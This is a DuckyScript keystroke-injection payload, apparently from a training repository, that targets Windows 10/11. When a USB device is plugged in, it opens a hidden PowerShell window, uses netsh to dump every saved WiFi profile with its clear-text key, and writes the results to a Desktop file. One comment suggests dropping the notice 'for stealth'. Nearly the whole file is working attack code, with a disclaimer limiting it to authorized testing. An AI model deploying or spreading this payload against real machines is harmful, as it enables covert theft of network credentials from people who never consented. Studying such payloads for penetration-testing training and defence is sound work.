REM ################################################
REM # Payload: FZ-I02 - WiFi Password Extractor
REM # Target:  Windows 10/11
REM # Author:  Ducky_Bash Training Repository
REM # Version: 1.0
REM #
REM # Description:
REM # Extracts saved WiFi passwords from Windows.
REM # Saves results to a file on the Desktop.
REM #
REM # MITRE ATT&CK: T1555 (Credentials from Password Stores)
REM # Documentation: Chapter_01/03_Intermediate_Scripts/FZ-I02_WiFi_Password_Extractor.md
REM #
REM # FOR AUTHORIZED TESTING ONLY
REM ################################################

REM Wait for USB enumeration
DELAY 2000

REM Open Run dialog and start hidden PowerShell
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1500

REM Create output file path
STRINGLN $outFile = "$env:USERPROFILE\Desktop\wifi_passwords.txt"

REM Write header
STRINGLN "WiFi Password Extraction - $(Get-Date)" | Out-File $outFile

REM Get all WiFi profiles and extract passwords
STRINGLN (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object { $profile = ($_ -split ":")[-1].Trim(); $result = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content"; if ($result) { "$profile : $($result -split ":")[-1].Trim()" } else { "$profile : No password stored" } } | Out-File $outFile -Append

REM Notify completion (optional - comment out for stealth)
STRINGLN Write-Host "Extraction complete. Check Desktop for wifi_passwords.txt"
DELAY 1000

REM Exit PowerShell
STRINGLN exit
